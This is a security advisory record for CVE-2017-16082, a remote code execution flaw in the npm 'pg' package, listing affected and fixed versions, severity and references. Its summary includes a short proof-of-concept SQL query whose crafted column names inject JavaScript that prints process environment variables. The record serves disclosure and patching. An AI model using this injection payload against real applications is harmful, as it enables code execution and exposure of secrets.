advisory_id: GHSA-wc9v-mj63-m9g5
datasource_id: github_osv_importer_v2/GHSA-wc9v-mj63-m9g5
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2018/07/GHSA-wc9v-mj63-m9g5/GHSA-wc9v-mj63-m9g5.json
aliases:
  - CVE-2017-16082
summary: "Remote Code Execution in pg\nAffected versions of `pg` contain a remote code execution\
  \ vulnerability that occurs when the remote database or query specifies a crafted column name.\
  \ \n\nThere are two specific scenarios in which it is likely for an application to be vulnerable:\n\
  1. The application executes unsafe, user-supplied sql which contains malicious column names.\n\
  2. The application connects to an untrusted database and executes a query returning results\
  \ which contain a malicious column name.\n\n## Proof of Concept\n```\nconst { Client } = require('pg')\n\
  const client = new Client()\nclient.connect()\n\nconst sql = `SELECT 1 AS \"\\\\'/*\", 2 AS\
  \ \"\\\\'*/\\n + console.log(process.env)] = null;\\n//\"`\n\nclient.query(sql, (err, res)\
  \ => {\n  client.end()\n})\n```\n\n\n## Recommendation\n\n* Version 2.x.x: Update to version\
  \ 2.11.2 or later.\n* Version 3.x.x: Update to version 3.6.4 or later.\n* Version 4.x.x: Update\
  \ to version 4.5.7 or later.\n* Version 5.x.x: Update to version 5.2.1 or later.\n* Version\
  \ 6.x.x: Update to version 6.4.2 or later. ( Note that versions 6.1.6, 6.2.5, and 6.3.3 are\
  \ also patched. )\n* Version 7.x.x: Update to version 7.1.2 or later. ( Note that version\
  \ 7.0.2 is also patched. )"
impacted_packages:
  - purl: pkg:npm/pg
    affected_versions: vers:npm/<2.11.2
    fixed_versions: vers:npm/2.11.2
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/pg
    affected_versions: vers:npm/>=3.0.0|<3.6.4
    fixed_versions: vers:npm/3.6.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/pg
    affected_versions: vers:npm/>=4.0.0|<4.5.7
    fixed_versions: vers:npm/4.5.7
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/pg
    affected_versions: vers:npm/>=5.0.0|<5.2.1
    fixed_versions: vers:npm/5.2.1
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/pg
    affected_versions: vers:npm/>=6.0.0|<6.0.5
    fixed_versions: vers:npm/6.0.5
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/pg
    affected_versions: vers:npm/>=6.1.0|<6.1.6
    fixed_versions: vers:npm/6.1.6
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/pg
    affected_versions: vers:npm/>=6.2.0|<6.2.5
    fixed_versions: vers:npm/6.2.5
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/pg
    affected_versions: vers:npm/>=6.3.0|<6.3.3
    fixed_versions: vers:npm/6.3.3
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/pg
    affected_versions: vers:npm/>=6.4.0|<6.4.2
    fixed_versions: vers:npm/6.4.2
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/pg
    affected_versions: vers:npm/>=7.0.0|<7.0.2
    fixed_versions: vers:npm/7.0.2
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/pg
    affected_versions: vers:npm/>=7.1.0|<7.1.2
    fixed_versions: vers:npm/7.1.2
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '9.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2018/07/GHSA-wc9v-mj63-m9g5/GHSA-wc9v-mj63-m9g5.json
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-94
references:
  - url: https://github.com/advisories/GHSA-wc9v-mj63-m9g5
    reference_type:
    reference_id:
  - url: https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability
    reference_type:
    reference_id:
  - url: https://www.npmjs.com/advisories/521
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2017-16082
    reference_type:
    reference_id: CVE-2017-16082
